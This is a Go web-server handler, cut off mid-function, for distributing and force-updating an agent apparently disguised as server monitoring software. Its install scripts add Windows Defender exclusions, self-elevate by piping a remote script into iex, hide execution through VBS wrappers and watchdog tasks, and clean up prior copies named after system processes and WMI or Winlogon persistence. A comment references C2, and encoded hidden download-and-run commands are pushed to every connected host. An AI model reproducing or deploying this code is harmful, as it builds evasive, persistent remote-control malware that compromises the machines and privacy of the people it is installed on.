package handler

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"server-monitor/internal/model"
	"server-monitor/internal/ws"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"golang.org/x/text/encoding/unicode"
	"gorm.io/gorm"
)

// requestScheme 从 Nginx 代理头或 TLS 状态推断请求协议（http/https）
func requestScheme(c *gin.Context) string {
	if proto := c.GetHeader("X-Forwarded-Proto"); proto != "" {
		return strings.ToLower(proto)
	}
	if c.Request.TLS != nil {
		return "https"
	}
	return "https" // 默认 HTTPS（服务端部署在 Nginx HTTPS 后面）
}

type AgentUpdateHandler struct {
	agentHub    *ws.AgentHub
	db          *gorm.DB
	storagePath string // agent 二进制存储路径
}

func NewAgentUpdateHandler(agentHub *ws.AgentHub, db *gorm.DB) *AgentUpdateHandler {
	dir := "data/agent-bin"
	os.MkdirAll(dir, 0755)
	return &AgentUpdateHandler{
		agentHub:    agentHub,
		db:          db,
		storagePath: dir,
	}
}

func (h *AgentUpdateHandler) agentBinPath() string {
	return filepath.Join(h.storagePath, "serverlinux")
}

func (h *AgentUpdateHandler) agentWinBinPath() string {
	return filepath.Join(h.storagePath, "agent-windows.exe")
}

func (h *AgentUpdateHandler) agentCsDllPath() string {
	return filepath.Join(h.storagePath, "MiniAgent.dll")
}

// Upload 接收上传的 agent 二进制（通过 platform 参数区分 linux/windows）
func (h *AgentUpdateHandler) Upload(c *gin.Context) {
	platform := c.DefaultQuery("platform", "linux")
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "未选择文件"})
		return
	}

	src, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": "打开文件失败"})
		return
	}
	defer src.Close()

	targetPath := h.agentBinPath()
	switch platform {
	case "windows":
		targetPath = h.agentWinBinPath()
	case "windows-cs":
		targetPath = h.agentCsDllPath()
	}

	dst, err := os.Create(targetPath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": "保存失败"})
		return
	}
	defer dst.Close()

	written, err := io.Copy(dst, src)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"success": false, "error": "写入失败"})
		return
	}

	os.Chmod(targetPath, 0755)

	log.Printf("Agent [%s] 二进制已上传: %s, 大小: %.2f MB", platform, targetPath, float64(written)/1024/1024)

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"data": gin.H{
			"size":     written,
			"filename": file.Filename,
			"platform": platform,
		},
	})
}

// blockBrowser 拦截浏览器直接访问，允许 curl/wget/PowerShell 等命令行工具
func (h *AgentUpdateHandler) blockBrowser(c *gin.Context) bool {
	ua := c.GetHeader("User-Agent")
	// 先放行已知命令行工具（PowerShell 默认 UA 含 Mozilla，必须优先判断）
	uaLower := strings.ToLower(ua)
	if strings.Contains(uaLower, "powershell") || strings.Contains(uaLower, "curl") || strings.Contains(uaLower, "wget") {
		return true
	}
	// 拦截浏览器
	if strings.Contains(ua, "Mozilla") || strings.Contains(ua, "Chrome") || strings.Contains(ua, "Safari") || strings.Contains(ua, "Edge") {
		c.String(http.StatusForbidden, "Access denied")
		return false
	}
	return true
}

// Download 提供 agent 二进制下载
func (h *AgentUpdateHandler) Download(c *gin.Context) {
	if !h.blockBrowser(c) {
		return
	}
	binPath := h.agentBinPath()
	info, err := os.Stat(binPath)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "Agent 二进制不存在，请先上传"})
		return
	}

	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Disposition", "attachment; filename=serverlinux")
	c.Header("Content-Length", fmt.Sprintf("%d", info.Size()))
	c.File(binPath)
}

// DownloadWin 提供 Windows agent 二进制下载
func (h *AgentUpdateHandler) DownloadWin(c *gin.Context) {
	if !h.blockBrowser(c) {
		return
	}
	binPath := h.agentWinBinPath()
	info, err := os.Stat(binPath)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"success": false, "error": "Windows Agent 二进制不存在，请先上传"})
		return
	}

	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Disposition", "attachment; filename=agent-windows.exe")
	c.Header("Content-Length", fmt.Sprintf("%d", info.Size()))
	c.File(binPath)
}

// Info 返回当前 agent 二进制信息（Linux + Windows）
func (h *AgentUpdateHandler) Info(c *gin.Context) {
	result := gin.H{}

	// Linux
	if info, err := os.Stat(h.agentBinPath()); err == nil {
		result["linux"] = gin.H{
			"exists":   true,
			"size":     info.Size(),
			"modified": info.ModTime().Format(time.RFC3339),
		}
	} else {
		result["linux"] = gin.H{"exists": false}
	}

	// Windows
	if info, err := os.Stat(h.agentWinBinPath()); err == nil {
		result["windows"] = gin.H{
			"exists":   true,
			"size":     info.Size(),
			"modified": info.ModTime().Format(time.RFC3339),
		}
	} else {
		result["windows"] = gin.H{"exists": false}
	}

	// MiniAgent.dll (C# 无文件)
	if info, err := os.Stat(h.agentCsDllPath()); err == nil {
		result["windows-cs"] = gin.H{
			"exists":   true,
			"size":     info.Size(),
			"modified": info.ModTime().Format(time.RFC3339),
		}
	} else {
		result["windows-cs"] = gin.H{"exists": false}
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"data":    result,
	})
}

// InstallScript 生成一键安装脚本（拦截浏览器访问）
func (h *AgentUpdateHandler) InstallScript(c *gin.Context) {
	if !h.blockBrowser(c) {
		return
	}
	token := c.Query("token")
	serverURL := fmt.Sprintf("%s://%s", requestScheme(c), c.Request.Host)
	downloadURL := serverURL + "/api/agent/download"

	// 获取签名密钥
	signKey := model.GetSignKey(h.db)

	// 配置文件内容：有 token 写入，无 token 则只写 SERVER_URL，Agent 启动时自动注册
	confLines := fmt.Sprintf("SERVER_URL=%s\nINTERVAL=10\nSIGN_KEY=%s", serverURL, signKey)
	modeHint := "自动注册模式（无需 Token，首次启动自动注册）"
	if token != "" {
		confLines = fmt.Sprintf("SERVER_URL=%s\nAGENT_TOKEN=%s\nINTERVAL=10\nSIGN_KEY=%s", serverURL, token, signKey)
		modeHint = "指定 Token 模式"
	}

	_ = modeHint // 已移除不必要的输出
	script := fmt.Sprintf(`#!/bin/bash
set -e
exec 3>&1
INSTALL_DIR="/opt/server-monitor-agent"
BINARY_NAME="serverlinux"
SERVICE_NAME="sysmon-agent"
TMP_BINARY="$INSTALL_DIR/$BINARY_NAME.new"
{
mkdir -p "$INSTALL_DIR"
} >/dev/null 2>&1

# 下载 Agent（显示进度条）
curl -#fSL -o "$TMP_BINARY" "%s"
{
chmod +x "$TMP_BINARY"

cat > "$INSTALL_DIR/agent.conf" <<EOF
%s
EOF

if command -v systemctl >/dev/null 2>&1; then
    systemctl stop monitor-agent 2>/dev/null || true
    systemctl disable monitor-agent 2>/dev/null || true
    systemctl stop "$SERVICE_NAME" 2>/dev/null || true
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
fi
pkill -f "$INSTALL_DIR/$BINARY_NAME" 2>/dev/null || true
sleep 1
mv -f "$TMP_BINARY" "$INSTALL_DIR/$BINARY_NAME"

if command -v systemctl >/dev/null 2>&1; then
    rm -f /etc/systemd/system/monitor-agent.service
    cat > /etc/systemd/system/$SERVICE_NAME.service <<EOF
[Unit]
Description=Server Monitor Agent
After=network.target

[Service]
Type=simple
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/$BINARY_NAME
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"
else
    cd "$INSTALL_DIR"
    nohup "./$BINARY_NAME" > agent.log 2>&1 &
fi
} >/dev/null 2>&1

echo "部署完成" >&3
`, downloadURL, confLines)

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, script)
}

// InstallScriptWin 生成 Windows 一键安装 PowerShell 脚本（拦截浏览器访问）
func (h *AgentUpdateHandler) InstallScriptWin(c *gin.Context) {
	if !h.blockBrowser(c) {
		return
	}
	token := c.Query("token")
	serverURL := fmt.Sprintf("%s://%s", requestScheme(c), c.Request.Host)
	downloadURL := serverURL + "/api/agent/download-win"
	scriptURL := serverURL + "/api/agent/install.ps1"
	if token != "" {
		scriptURL += "?token=" + url.QueryEscape(token)
	}

	// 获取签名密钥
	signKeyWin := model.GetSignKey(h.db)

	// 配置文件行（PowerShell 数组格式，每个元素是一行）
	confArray := fmt.Sprintf("\"SERVER_URL=%s\",\"INTERVAL=10\",\"SIGN_KEY=%s\"", serverURL, signKeyWin)
	modeHint := "自动注册模式"
	if token != "" {
		confArray = fmt.Sprintf("\"SERVER_URL=%s\",\"AGENT_TOKEN=%s\",\"INTERVAL=10\",\"SIGN_KEY=%s\"", serverURL, token, signKeyWin)
		modeHint = "指定 Token 模式"
	}

	_ = modeHint // 已移除不必要的输出
	// 使用双引号 Go 字符串拼接，避免 raw string 中出现 backtick
	script := "$ErrorActionPreference = \"Continue\"\r\n"
	script += "$InstallDir = \"$env:ProgramData\\ServerMonitorAgent\"\r\n"
	script += "$BinaryName = \"agent-windows.exe\"\r\n"
	script += "$target = \"$InstallDir\\$BinaryName\"\r\n"
	script += "$legacyExePath = \"$InstallDir\\WinNetSvc.exe\"\r\n"
	script += "$configPath = \"$InstallDir\\agent.conf\"\r\n"
	script += "$wdScriptPath = \"$InstallDir\\watchdog.ps1\"\r\n"
	script += "$vbsPath = \"$InstallDir\\start-hidden.vbs\"\r\n"
	script += "$recoverPath = \"$InstallDir\\recover.ps1\"\r\n"
	script += "$netdiagPath = \"$InstallDir\\netdiag.ps1\"\r\n"
	script += "$netsvcPath = \"$InstallDir\\netsvc.ps1\"\r\n"
	script += "$wmiSetupPath = \"$InstallDir\\wmi_setup.ps1\"\r\n"
	script += "$startupDir = [Environment]::GetFolderPath('Startup')\r\n"
	script += "$shortcutPath = Join-Path $startupDir \"ServerMonitorAgent.lnk\"\r\n"
	script += fmt.Sprintf("$scriptUrl = \"%s\"\r\n", scriptURL)
	script += "$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\r\n"
	script += "if (-not $isAdmin) {\r\n"
	script += "    Write-Host \"检测到需要管理员权限，正在请求 UAC 提权...\" -ForegroundColor Yellow\r\n"
	script += "    $elevArgs = '-NoProfile -ExecutionPolicy Bypass -Command \"irm ''' + $scriptUrl + ''' | iex\"'\r\n"
	script += "    try {\r\n"
	script += "        Start-Process -FilePath \"powershell.exe\" -Verb RunAs -ArgumentList $elevArgs | Out-Null\r\n"
	script += "        return\r\n"
	script += "    } catch {\r\n"
	script += "        throw \"安装需要管理员权限，请在 UAC 提示中点击 Yes。\"\r\n"
	script += "    }\r\n"
	script += "}\r\n"
	// [关键] 添加 Defender 排除（在下载之前，防止二进制被立即删除）
	script += "Write-Host \"[1/6] 添加安全排除...\" -ForegroundColor Cyan\r\n"
	script += "try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}\r\n"
	script += "try { Add-MpPreference -ExclusionProcess $BinaryName -ErrorAction SilentlyContinue } catch {}\r\n"
	script += "try { Add-MpPreference -ExclusionProcess \"$InstallDir\\$BinaryName\" -ErrorAction SilentlyContinue } catch {}\r\n"
	script += "if (!(Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }\r\n"
	// 杀死所有可能的旧进程（包括通配符匹配 ProgramData 下的 agent）
	script += "Write-Host \"[2/6] 清理旧版本...\" -ForegroundColor Cyan\r\n"
	script += "Get-Process -Name \"agent-windows\",\"WinNetSvc\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue\r\n"
	script += "Get-Process | Where-Object { $_.Path -like \"$env:ProgramData\\*\\agent*.exe\" -or $_.Path -like \"$env:ProgramData\\*\\svchost*.exe\" -or $_.Path -like \"$env:ProgramData\\*\\RuntimeBroker*.exe\" -or $_.Path -like \"$env:ProgramData\\*\\SecurityHealth*.exe\" -or $_.Path -like \"$env:ProgramData\\*\\WmiPrvSE*.exe\" -or $_.Path -like \"$env:ProgramData\\*\\SearchProtocol*.exe\" -or $_.Path -like \"$env:ProgramData\\*\\DiagTrack*.exe\" } -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue\r\n"
	script += "Start-Sleep -Seconds 2\r\n"
	script += "foreach ($task in @(\"WindowsNetworkCfgSvc\",\"WindowsNetworkDiagnostics\",\"WindowsNetworkReporting\",\"ServerMonitorAgent\",\"ServerMonitorAgentWatchdog\")) {\r\n"
	script += "    Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue\r\n"
	script += "}\r\n"
	script += "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='AgentGuard'\" | Remove-WmiObject -ErrorAction SilentlyContinue\r\n"
	script += "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='AgentGuard'\" | Remove-WmiObject -ErrorAction SilentlyContinue\r\n"
	script += "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*AgentGuard*'} | Remove-WmiObject -ErrorAction SilentlyContinue\r\n"
	script += "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsNetworkCfg' -ErrorAction SilentlyContinue\r\n"
	script += "Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name 'UserInitMprLogonScript' -ErrorAction SilentlyContinue\r\n"
	script += "& attrib.exe -R -H -S $InstallDir /S /D 2>$null\r\n"
	script += "& takeown.exe /F $InstallDir /R /D Y 2>$null | Out-Null\r\n"
	script += "& icacls.exe $InstallDir /reset /T /C 2>$null | Out-Null\r\n"
	script += "& icacls.exe $InstallDir /grant 'Administrators:(OI)(CI)F' 'SYSTEM:(OI)(CI)F' 'Users:(OI)(CI)RX' /T /C 2>$null | Out-Null\r\n"
	script += "if (Test-Path $legacyExePath) { & attrib.exe -R -H -S $legacyExePath 2>$null; Remove-Item $legacyExePath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $configPath) { & attrib.exe -R -H -S $configPath 2>$null; Remove-Item $configPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $target) { & attrib.exe -R -H -S $target 2>$null; Remove-Item $target -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $wdScriptPath) { & attrib.exe -R -H -S $wdScriptPath 2>$null; Remove-Item $wdScriptPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $vbsPath) { & attrib.exe -R -H -S $vbsPath 2>$null; Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $recoverPath) { & attrib.exe -R -H -S $recoverPath 2>$null; Remove-Item $recoverPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $netdiagPath) { & attrib.exe -R -H -S $netdiagPath 2>$null; Remove-Item $netdiagPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $netsvcPath) { & attrib.exe -R -H -S $netsvcPath 2>$null; Remove-Item $netsvcPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $wmiSetupPath) { & attrib.exe -R -H -S $wmiSetupPath 2>$null; Remove-Item $wmiSetupPath -Force -ErrorAction SilentlyContinue }\r\n"
	script += "if (Test-Path $shortcutPath) { & attrib.exe -R -H -S $shortcutPath 2>$null; Remove-Item $shortcutPath -Force -ErrorAction SilentlyContinue }\r\n"
	// 下载
	script += "Write-Host \"[3/6] 下载 Agent...\" -ForegroundColor Cyan\r\n"
	script += "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\n"
	script += "$wc = New-Object Net.WebClient\r\n"
	script += "$wc.Headers.Add(\"User-Agent\",\"PowerShell\")\r\n"
	script += "Register-ObjectEvent -InputObject $wc -EventName DownloadProgressChanged -Action { Write-Host -NoNewline (\"`r下载中: {0}% ({1:N1}/{2:N1} MB)  \" -f $EventArgs.ProgressPercentage, ($EventArgs.BytesReceived/1MB), ($EventArgs.TotalBytesToReceive/1MB)) } | Out-Null\r\n"
	script += "$done = Register-ObjectEvent -InputObject $wc -EventName DownloadFileCompleted -Action { } -MessageData @{}\r\n"
	script += fmt.Sprintf("$wc.DownloadFileAsync(\"%s\", $target)\r\n", downloadURL)
	script += "while ($wc.IsBusy) { Start-Sleep -Milliseconds 200 }\r\n"
	script += "Write-Host \"\"\r\n"
	script += "Get-EventSubscriber | Unregister-Event -Force | Out-Null\r\n"
	script += "$wc.Dispose()\r\n"
	// 验证下载
	script += "if (!(Test-Path $target) -or (Get-Item $target).Length -lt 100000) {\r\n"
	script += "    Write-Host \"错误: 二进制下载失败或文件过小\" -ForegroundColor Red\r\n"
	script += "    return\r\n"
	script += "}\r\n"
	script += "Write-Host \"下载完成: $((Get-Item $target).Length / 1MB) MB\" -ForegroundColor Green\r\n"
	// 配置文件（无 BOM）
	script += "Write-Host \"[4/6] 写入配置...\" -ForegroundColor Cyan\r\n"
	script += fmt.Sprintf("$utf8NoBom = New-Object System.Text.UTF8Encoding($false); [System.IO.File]::WriteAllLines($configPath, @(%s), $utf8NoBom)\r\n", confArray)
	// 管理员判断 + 安装
	script += "Write-Host \"[5/6] 注册启动项...\" -ForegroundColor Cyan\r\n"
	script += "if ($isAdmin) {\r\n"
	script += "    $taskName = \"ServerMonitorAgent\"\r\n"
	script += "    $wdTaskName = \"ServerMonitorAgentWatchdog\"\r\n"
	// 清理旧任务
	script += "    Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue\r\n"
	script += "    Get-ScheduledTask -TaskName $wdTaskName -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue\r\n"
	// 主任务：用户登录时启动（交互式会话，支持桌面截图）
	script += "    $action = New-ScheduledTaskAction -Execute \"$InstallDir\\$BinaryName\" -WorkingDirectory $InstallDir\r\n"
	script += "    $trigger = New-ScheduledTaskTrigger -AtLogOn -User \"$env:USERDOMAIN\\$env:USERNAME\"\r\n"
	script += "    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 9999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 3650)\r\n"
	script += "    $principal = New-ScheduledTaskPrincipal -UserId \"$env:USERDOMAIN\\$env:USERNAME\" -LogonType Interactive -RunLevel Highest\r\n"
	script += "    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description \"Server Monitor Agent\" | Out-Null\r\n"
	script += "    Start-ScheduledTask -TaskName $taskName\r\n"
	// 看门狗：写 watchdog.ps1 + VBS 包装器（wscript.exe 启动 VBS → WScript.Shell.Run 以 window=0 启动 PowerShell，完全不闪窗口）
	script += "    $wdPs1 = 'if (!(Get-Process -Name \"agent-windows\" -ErrorAction SilentlyContinue)) { Start-Process -FilePath \"' + $InstallDir + '\\' + $BinaryName + '\" -WorkingDirectory \"' + $InstallDir + '\" -WindowStyle Hidden }'\r\n"
	script += "    [System.IO.File]::WriteAllText($wdScriptPath, $wdPs1)\r\n"
	script += "    $wdVbsPath = \"$InstallDir\\watchdog.vbs\"\r\n"
	script += "    $wdVbs = 'CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"\"\"\"' + $wdScriptPath + '\"\"\"\"\"\", 0, False'\r\n"
	script += "    [System.IO.File]::WriteAllText($wdVbsPath, $wdVbs)\r\n"
	script += "    $wdAction = New-ScheduledTaskAction -Execute \"wscript.exe\" -Argument ('\"' + $wdVbsPath + '\"') -WorkingDirectory $InstallDir\r\n"
	script += "    $wdTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)\r\n"
	script += "    Register-ScheduledTask -TaskName $wdTaskName -Action $wdAction -Trigger $wdTrigger -Settings $settings -Principal $principal -Description \"Agent Watchdog\" | Out-Null\r\n"
	script += "} else {\r\n"
	// 非管理员：用 VBS 无窗口启动 + 启动目录快捷方式
	script += "    $vbsContent = 'CreateObject(\"WScript.Shell\").Run \"' + $InstallDir + '\\' + $BinaryName + '\", 0, False'\r\n"
	script += "    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)\r\n"
	script += "    $ws = New-Object -ComObject WScript.Shell\r\n"
	script += "    $sc = $ws.CreateShortcut($shortcutPath)\r\n"
	script += "    $sc.TargetPath = \"wscript.exe\"\r\n"
	script += "    $sc.Arguments = \"$vbsPath\"\r\n"
	script += "    $sc.WorkingDirectory = $InstallDir\r\n"
	script += "    $sc.WindowStyle = 7\r\n"
	script += "    $sc.Save()\r\n"
	// 用 VBS 启动（完全无窗口）
	script += "    Start-Process -FilePath \"wscript.exe\" -ArgumentList $vbsPath -WindowStyle Hidden\r\n"
	script += "}\r\n"
	// [关键] 验证进程启动 + 回退直接启动
	script += "Write-Host \"[6/6] 验证启动...\" -ForegroundColor Cyan\r\n"
	script += "Start-Sleep -Seconds 3\r\n"
	script += "$proc = Get-Process -Name \"agent-windows\" -ErrorAction SilentlyContinue\r\n"
	script += "if ($proc) {\r\n"
	script += "    Write-Host \"Agent 进程已启动 (PID: $($proc.Id))\" -ForegroundColor Green\r\n"
	script += "} else {\r\n"
	script += "    Write-Host \"计划任务启动失败，尝试直接启动...\" -ForegroundColor Yellow\r\n"
	script += "    Start-Process -FilePath $target -WorkingDirectory $InstallDir -WindowStyle Hidden\r\n"
	script += "    Start-Sleep -Seconds 3\r\n"
	script += "    $proc = Get-Process -Name \"agent-windows\" -ErrorAction SilentlyContinue\r\n"
	script += "    if ($proc) {\r\n"
	script += "        Write-Host \"Agent 直接启动成功 (PID: $($proc.Id))\" -ForegroundColor Green\r\n"
	script += "    } else {\r\n"
	script += "        Write-Host \"Agent 启动失败! 请检查:\" -ForegroundColor Red\r\n"
	script += "        Write-Host \"  1. Windows Defender 是否隔离了文件: $target\" -ForegroundColor Red\r\n"
	script += "        Write-Host \"  2. 检查日志: type $InstallDir\\agent.log\" -ForegroundColor Red\r\n"
	script += "        if (Test-Path $target) { Write-Host \"  文件存在: $((Get-Item $target).Length) bytes\" } else { Write-Host \"  文件已被删除(可能被杀软隔离)!\" -ForegroundColor Red }\r\n"
	script += "    }\r\n"
	script += "}\r\n"
	script += "Write-Host \"部署完成\" -ForegroundColor Green\r\n"
	_ = serverURL

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, script)
}

// ForceUpdateWin 强制更新 Windows Agent：通过 exec 命令发送 PowerShell 脚本
// 适用于老版本 agent 无法通过正常 update 机制自更新的情况
func (h *AgentUpdateHandler) ForceUpdateWin(c *gin.Context) {
	binPath := h.agentWinBinPath()
	if _, err := os.Stat(binPath); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "Windows Agent 二进制不存在，请先上传"})
		return
	}

	downloadURL := fmt.Sprintf("%s://%s/api/agent/download-win", requestScheme(c), c.Request.Host)

	// PowerShell 脚本：下载 → 验证 → 备份 → 写批处理 → 启动批处理
	// 下载失败或文件太小时直接 exit，不会杀进程
	psLines := []string{
		`$ErrorActionPreference='Stop'`,
		`$self=(Get-Process -Name 'agent-windows' -ErrorAction SilentlyContinue|Select -First 1).Path`,
		`if(!$self){$self='C:\ProgramData\ServerMonitorAgent\agent-windows.exe'}`,
		`$dir=Split-Path $self`,
		`$tmp=Join-Path $dir '.agent-update-tmp.exe'`,
		`$bak=$self+'.bak'`,
		`try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('` + downloadURL + `',$tmp)}catch{exit 1}`,
		`if(!(Test-Path $tmp)-or(Get-Item $tmp).Length -lt 1000){exit 1}`,
		`Copy-Item $self $bak -Force -ErrorAction SilentlyContinue`,
		`$n=[IO.Path]::GetFileName($self)`,
		`$bat=Join-Path $dir '.force-update.bat'`,
		`$L=@()`,
		`$L+='@echo off'`,
		`$L+='if not exist "'+$tmp+'" goto end'`,
		`$L+='ping -n 3 127.0.0.1 >nul'`,
		`$L+='taskkill /F /IM "'+$n+'" >nul 2>&1'`,
		`$L+='ping -n 2 127.0.0.1 >nul'`,
		`$L+='del /F /Q "'+$self+'" >nul 2>&1'`,
		`$L+='move /Y "'+$tmp+'" "'+$self+'" >nul 2>&1'`,
		`$L+='if not exist "'+$self+'" copy /Y "'+$bak+'" "'+$self+'" >nul 2>&1'`,
		`$L+='start "" "'+$self+'"'`,
		`$L+=':end'`,
		`$L+='del /F /Q "%~f0" >nul 2>&1'`,
		`$L|Set-Content $bat -Encoding ASCII`,
		`Start-Process cmd.exe -ArgumentList '/C',$bat -WindowStyle Hidden`,
	}
	psInner := strings.Join(psLines, ";")
	// UTF-16LE 编码后 Base64
	utf16 := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
	encoder := utf16.NewEncoder()
	encoded, _ := encoder.Bytes([]byte(psInner))
	b64 := base64.StdEncoding.EncodeToString(encoded)
	psScript := "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " + b64

	// 获取所有在线 Windows agent
	h.agentHub.ForEachAgent(func(serverID, osType string) {
		if osType != "windows" {
			return
		}
		go func(sid string) {
			result, err := h.agentHub.ExecCommand(sid, psScript, 60*time.Second)
			if err != nil {
				log.Printf("[ForceUpdate] agent %s 执行失败: %v", sid, err)
			} else if result.ExitCode != 0 {
				log.Printf("[ForceUpdate] agent %s 退出码=%d, 输出: %s", sid, result.ExitCode, result.Output)
			} else {
				log.Printf("[ForceUpdate] agent %s 强制更新已触发", sid)
			}
		}(serverID)
	})

	c.JSON(http.StatusOK, gin.H{"success": true, "message": "强制更新指令已发送到所有在线 Windows Agent"})
}

// ForceUpdateLinux 强制更新 Linux Agent：通过 exec 命令发送 bash 脚本
// 同时发送 C2 编码版和明文版，确保新旧 agent 都能收到
func (h *AgentUpdateHandler) ForceUpdateLinux(c *gin.Context) {
	binPath := h.agentBinPath()
	if _, err := os.Stat(binPath); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"success": false, "error": "Linux Agent 二进制不存在，请先上传"})
		return
	}

	downloadURL := fmt.Sprintf("%s://%s/api/agent/download", requestScheme(c), c.Request.Host)

	// Bash 脚本：找进程 → 下载 → 校验 → 替换 → 杀全部旧进程 → 重启
	bashScript := fmt.Sprintf(`bash -c '
SELF=""
# 找到正在运行的 agent 进程路径
for p in $(pgrep -f "serverlinux|agentlinux|agent-linux|ServerMonitorAgent"); do
  F=$(readlink -f /proc/$p/exe 2>/dev/null)
  if [ -n "$F" ] && [ -f "$F" ]; then SELF="$F"; break; fi
done
if [ -z "$SELF" ]; then SELF="/usr/local/bin/serverlinux"; fi
DIR=$(dirname "$SELF")
TMP="$DIR/.agent-update-tmp"
BAK="$SELF.bak"
# 下载
wget -q --no-check-certificate -O "$TMP" "%s" 2>/dev/null || curl -skL -o "$TMP" "%s" 2>/dev/null
# 校验大小 >1MB
SIZE=$(stat -c%%s "$TMP" 2>/dev/null || stat -f%%z "$TMP" 2>/dev/null || echo 0)
if [ "$SIZE" -lt 1048576 ]; then rm -f "$TMP"; echo "download too small: $SIZE"; exit 1; fi
# 备份 + 替换
cp -f "$SELF" "$BAK" 2>/dev/null
chmod +x "$TMP"
mv -f "$TMP" "$SELF"
# 后台重启：按可执行文件路径杀掉旧 agent 进程，然后启动新的
(
  sleep 1
  for p in $(pgrep -f "serverlinux|agentlinux|agent-linux|ServerMonitorAgent"); do
    F=$(readlink -f /proc/$p/exe 2>/dev/null)
    case "$F" in
      *serverlinux*|*agentlinux*|*agent-linux*|*ServerMonitorAgent*) kill -9 "$p" 2>/dev/null ;;
    esac
  done
  sleep 2
  "$SELF" &
) >/dev/null 2>&1 &
echo "ok"
'`, downloadURL, downloadURL)

	sent := 0
	failed := 0
	h.agentHub.ForEachAgent(func(serverID, osType string) {
		if osType != "linux" {
			return
		}
		// 发射即忘：同时发送 C2 编码版和明文版，不等待响应
		if err := h.agentHub.FireExec(serverID, bashScript); err != nil {
			failed++
			log.Printf("[ForceUpdateLinux] agent %s 发送失败: %v", serverID, err)
		} else {
			sent++
			log.Printf("[ForceUpdateLinux] agent %s 已发射更新指令", serverID)
		}
	})

	c.JSON(http.StatusOK, gin.H{"success": true, "message": fmt.Sprintf("强制更新指令已发送到 %d 个在线 Linux Agent", sent), "data": gin.H{"sent": sent, "failed": failed}})
}

// PushUpdate 向在线 Agent 推送更新指令
func (h *AgentUpdateHandler) PushUpdate(c *gin.Context) {
	var req struct {
		ServerIDs []string `json:"serverIds"` // 空则更新所有
		Platform  string   `json:"platform"`  // linux / windows，默认 linux
	}
	c.ShouldBindJSON(&req)

	if req.Platform == "" {
		req.Platform = "linux"
	}

	// 检查对应平台的二进制是否存在
	binPath := h.agentBinPath()
	downloadURL := fmt.Sprintf("%s://%s/api/agent/download", requestScheme(c), c.Request.Host)
	if req.Platform == "windows" {
		binPath = h.agentWinBinPath()
		downloadURL = fmt.Sprintf("%s://%s/api/agent/download-win", requestScheme(c), c.Request.Host)
	}

	if _, err := os.Stat(binPath); err != nil {
